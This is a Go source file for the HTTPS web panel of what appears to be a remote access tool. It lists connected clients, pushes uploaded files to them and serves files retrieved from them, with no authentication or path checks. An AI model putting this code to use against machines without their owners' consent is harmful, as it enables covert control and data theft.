package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"rat/shared"
	"strconv"
)

func init() {
	funcMap := template.FuncMap{
		"Version": func() string { return shared.Version },
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("index.template.html").Funcs(funcMap).ParseFiles("web/index.template.html", "web/head.template.html", "web/tail.template.html"))

		err := t.Execute(w, &Clients)

		if err != nil {
			panic(err)
		}
	})
	http.HandleFunc("/clients", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("clients.template.html").Funcs(funcMap).ParseFiles("web/clients.template.html"))

		err := t.Execute(w, &Clients)
		if err != nil {
			panic(err)
		}
	})

	http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
		dir := r.PostFormValue("directory")

		file, header, err := r.FormFile("file")

		if err != nil {
			fmt.Println(err.Error())
		}

		id, _ := strconv.Atoi(r.PostFormValue("id"))
		client := GetClient(id)

		remote := dir + header.Filename
		fmt.Println("Remote file:", remote)

		err = StartTransfer(client, file, remote)
		if err != nil {
			fmt.Println("upload:", err.Error())
		}
	})
	http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
		if file, ok := TempFiles[r.FormValue("key")]; ok {
			w.Header().Set("Content-Disposition", "attachment; filename="+file.Name)

			http.ServeFile(w, r, file.Path)
		}
	})
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static"))))
	http.Handle("/scripts/", http.StripPrefix("/scripts/", http.FileServer(http.Dir("./web/scripts"))))
}

func startWebserver() {
	log.Fatal(http.ListenAndServeTLS(Config.HttpAddress, "cert.pem", "private.key", nil))
}
